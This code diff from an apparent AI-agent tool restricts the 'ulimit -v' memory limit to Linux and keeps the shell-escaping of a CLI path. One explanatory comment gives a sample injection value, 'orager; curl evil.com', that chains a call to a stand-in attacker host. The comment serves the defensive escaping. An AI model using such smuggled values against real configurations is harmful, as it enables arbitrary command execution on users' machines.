@@ -2396,14 +2396,18 @@ export async function executeAgentLoop(
       let spawnCmd: string;
       let spawnArgs: string[];
       if (platform === "darwin" || platform === "linux") {
-        const ulimits = [`ulimit -v ${memLimitKb}`];
+        // ulimit -v (virtual memory) is only supported on Linux.
+        // macOS (Darwin) does not support it and returns "Invalid argument".
+        const ulimits: string[] = [];
+        if (platform === "linux" && memLimitKb > 0) ulimits.push(`ulimit -v ${memLimitKb}`);
         if (cpuLimitSecs > 0) ulimits.push(`ulimit -t ${cpuLimitSecs}`);
         const quotedArgs = args.map((a: string) => `'${a.replace(/'/g, "'\\''")}'`).join(" ");
         spawnCmd = "bash";
         // R-08: Escape cliPath to prevent command injection via malicious config values.
         // Without this, a cliPath like "orager; curl evil.com" would execute arbitrary commands.
         const escapedCliPath = `'${cliPath.replace(/'/g, "'\\''")}'`;
-        spawnArgs = ["-c", `${ulimits.join(" && ")} && exec ${escapedCliPath} ${quotedArgs}`];
+        const prefix = ulimits.length > 0 ? `${ulimits.join(" && ")} && ` : "";
+        spawnArgs = ["-c", `${prefix}exec ${escapedCliPath} ${quotedArgs}`];
       } else {
         spawnCmd = cliPath;
         spawnArgs = args;
